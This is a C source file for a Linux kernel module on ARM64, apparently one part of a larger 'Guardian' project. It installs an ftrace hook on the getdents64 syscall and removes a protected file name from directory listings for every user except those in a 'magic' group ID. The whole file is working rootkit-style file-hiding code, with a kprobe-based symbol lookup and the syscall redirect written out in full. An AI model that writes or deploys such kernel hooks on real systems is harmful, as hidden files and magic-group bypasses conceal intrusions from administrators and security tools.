// SPDX-License-Identifier: GPL-2.0
/*
 * cloak_ft.c — Guardian Module (ftrace variant), Part 3
 *
 * Ftrace IP redirect on __arm64_sys_getdents64: hides PROTECTED_BASENAME
 * from directory listings unless the caller has MAGIC_GID.
 *
 * The IP redirect technique:
 *   1. Ftrace callback fires at __arm64_sys_getdents64 entry
 *   2. Callback redirects instruction pointer to our wrapper function
 *   3. Wrapper calls original (per-CPU guard prevents re-entry)
 *   4. Wrapper filters the dirent buffer after original returns
 *   5. Wrapper returns modified byte count
 *
 * This is the ftrace equivalent of the kretprobe pattern: run code
 * AFTER the original syscall, but using IP redirect instead of return probes.
 */

#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/percpu.h>
#include <asm/ptrace.h>
#include "guardian_ftrace.h"

typedef long (*syscall_fn_t)(const struct pt_regs *);

static unsigned long cloak_target_addr;
static syscall_fn_t  original_getdents64;
static DEFINE_PER_CPU(int, cloak_active);

static unsigned long kprobe_lookup_ft(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp) < 0)
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

/*
 * Wrapper function — called instead of __arm64_sys_getdents64.
 *
 * Receives the original pt_regs (the syscall dispatcher's pt_regs).
 * On AArch64, __arm64_sys_getdents64 takes a single pt_regs* argument,
 * and the actual syscall args are in regs->regs[0..2]:
 *   regs->regs[0] = fd
 *   regs->regs[1] = dirp (user buffer)
 *   regs->regs[2] = count
 *
 * This function runs in normal process context (GFP_KERNEL OK).
 * notrace to prevent ftrace from tracing the wrapper itself.
 */
static notrace long guardian_getdents64_wrapper(const struct pt_regs *regs)
{
  struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->regs[1];
  struct linux_dirent64 *current_dir, *prev = NULL;
  long total_bytes;
  char *kbuf;
  int offset = 0;

  total_bytes = original_getdents64(regs);
  this_cpu_write(cloak_active, 0);
  
  /* Nothing to filter if getdents64 returned 0 or error */
	if (total_bytes <= 0)
		return total_bytes;

  /* Privileged user sees everything */
	if (guardian_has_magic_gid())
		return total_bytes;

	kbuf = kmalloc(total_bytes, GFP_KERNEL);
	if (!kbuf)
		return 0;

  if (copy_from_user(kbuf, dirp, total_bytes)) {
		kfree(kbuf);
		return 0;
	}

  /* Walk the dirent buffer and remove matching entries */
	while (offset < total_bytes) {
		current_dir = (struct linux_dirent64 *)(kbuf + offset);

		if (strcmp(current_dir->d_name, PROTECTED_BASENAME) != 0) {
			/* No match — advance */
			prev = current_dir;
			offset += current_dir->d_reclen;
		} else if (prev) {
			/* Match, not first entry: prev absorbs current */
			prev->d_reclen += current_dir->d_reclen;
			offset += current_dir->d_reclen;
		} else {
			/* Match, first entry: shift everything forward */
			int reclen = current_dir->d_reclen;

			total_bytes -= reclen;
			memmove(kbuf, kbuf + reclen, total_bytes);
			/* Don't advance offset — new data is at same position */
		}
	}


  /* Write filtered buffer back to userspace*/
	copy_to_user(dirp, kbuf, total_bytes);

  kfree(kbuf);
  return total_bytes;
}

/*
 * Ftrace callback — redirect IP to our wrapper.
 *
 * On AArch64 with DYNAMIC_FTRACE_WITH_ARGS, we modify the saved PC
 * so that when ftrace returns, execution continues at our wrapper
 * instead of the original function body.
 */
static void notrace cloak_callback(unsigned long ip, unsigned long parent_ip,
				   struct ftrace_ops *op,
				   struct ftrace_regs *fregs)
{
  if (this_cpu_read(cloak_active))
    return;

  this_cpu_write(cloak_active, 1);
  ftrace_regs_set_instruction_pointer(fregs, (unsigned long)guardian_getdents64_wrapper);
}

static struct ftrace_ops cloak_ops = {
	.func  = cloak_callback,
	.flags = FTRACE_OPS_FL_IPMODIFY |
		 FTRACE_OPS_FL_RECURSION,
};

int cloak_init(void)
{
  int ret;

  
  cloak_target_addr = kprobe_lookup_ft("__arm64_sys_getdents64");
  if (cloak_target_addr == 0) return -ENOENT;

  original_getdents64 = (syscall_fn_t)cloak_target_addr;

  ret = ftrace_set_filter_ip(&cloak_ops, cloak_target_addr, 0, 0);
  if (ret < 0) return ret;

  ret = register_ftrace_function(&cloak_ops);
  if (ret < 0) {
    ftrace_set_filter_ip(&cloak_ops, cloak_target_addr, 1, 0);
    return ret;
  }

  return 0;
}

void cloak_exit(void)
{
  unregister_ftrace_function(&cloak_ops);
  ftrace_set_filter_ip(&cloak_ops, cloak_target_addr, 1, 0);

  pr_info("ftrace successfully unregistered\n");
}
